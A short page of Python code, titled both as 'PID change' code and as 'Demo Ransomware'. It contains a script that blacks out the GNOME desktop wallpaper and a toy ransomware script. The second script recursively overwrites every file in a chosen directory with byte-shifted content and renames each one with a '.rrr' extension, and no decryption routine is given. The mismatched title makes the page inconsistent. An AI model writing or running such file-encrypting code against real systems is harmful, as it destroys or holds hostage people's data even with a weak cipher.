---
title: "Demo PID change code in Python"

---

### Demo Ransomware code in Python


``` 
import subprocess

def change_wallpaper_to_black():
    # Command to change wallpaper using gsettings
    command = "gsettings set org.gnome.desktop.background primary-color '#000000'"
    
    try:
        # Execute the command
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print("Error:", e)

if __name__ == "__main__":
    change_wallpaper_to_black()
```


```
import os

def encrypt_file(file_path):
    # Open the file in read mode
    with open(file_path, 'rb') as f:
        data = f.read()
    
    # Define the encryption key (for demonstration purposes)
    encryption_key = 5
    
    # Encrypt the data by shifting ASCII values
    encrypted_data = bytes([(byte + encryption_key) % 256 for byte in data])
    
    # Write the encrypted data back to the file
    with open(file_path, 'wb') as f:
        f.write(encrypted_data)
    
    # Change the file extension to .rrr
    os.rename(file_path, file_path + ".rrr")
    
    # Print the encrypted file path
    print(f"Encrypted: {file_path}.rrr")

def encrypt_directory(directory):
    # Iterate over all files in the directory
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path)

if __name__ == "__main__":
    directory_path = input("Enter the directory path to encrypt files: ")
    encrypt_directory(directory_path)
    print("Encryption and extension change complete!")
    
```


